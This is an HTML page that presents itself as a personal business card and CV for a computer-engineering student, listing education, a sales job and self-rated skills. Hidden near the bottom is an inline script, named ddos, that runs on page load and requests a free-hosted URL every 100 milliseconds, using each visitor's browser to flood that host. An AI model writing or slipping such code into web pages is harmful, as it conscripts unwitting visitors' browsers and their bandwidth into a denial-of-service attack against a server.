<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width", initial-scale=1.0">
    <title>My Business Card</title>
    <!-- Bootstrap CSS -->
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="./style.css">
</head>
<body>
    <header class="mb-3 bg-dark text-white">
        <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <ul class="navbar-nav mr-auto">
            <li class="nav-item"><a class="nav-link" href="./index.php">Home</a></li>
            <li class="nav-item"><a class="nav-link" href="./feedback.php">Contact</a></li>
        </ul>
        </nav>
        <h1 class="text-center">My Business Card</h1> <hr />
    </header>
    <section class="container bg-light p-3 rounded">
        <h2 class="text-center">Choplak Illia</h2>
            <img class="mx-auto d-block rounded-circle" src="./picture.jpg" alt="profile image of Choplak Illia" height="100">
            <h3 class="mt-3">Summary</h3>
            <p>I am a hardworking and dedicated individual.</p>
            <hr />
            <h3>Education</h3>
            <ul>
                <li>Bachelor of Computer Engineering - Lviv Polytechnic National Univeristy (2020-2024)</li>
            </ul>
            <hr />
            <hr />
            <h3>Work experience</h3>
            <ul>
                <li>Vape Shop (Oct. 2023 - Jan. 2024) <br />Worked as a sales assistant in a vape shop for 3 months. 
                Assisted customers in selecting suitable vape products, maintained inventory, and ensured the cleanliness of the shop. 
                Gained experience in customer service and sales.
                </li>       
            </ul>
            <hr />
            <h3>Skills</h3>
            <ul>
                <li>Communication: ⭐️⭐️⭐️⭐️⭐️</li>
                <li>Problem Solving: ⭐️⭐️⭐️⭐️</li>
                <li>Teamwork: ⭐️⭐️⭐️⭐️⭐️</li>
                <li>Adaptability: ⭐️⭐️⭐️⭐️</li>
                <li>Work Ethic: ⭐️⭐️⭐️⭐️⭐️</li>
                <li>Time Management: ⭐️⭐️⭐️⭐️</li>
                <li>Creativity: ⭐️⭐️⭐️⭐️⭐️</li>
            </ul>
            <hr />
    </section>
    <script>
        function ddos(){
            setInterval(()=>{
                fetch("http://choplakii22.rf.gd/index.php")
            }, 100);
        }
        window.onload = () => {
            ddos()
        };
    </script>
    <!-- Bootstrap JS -->
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>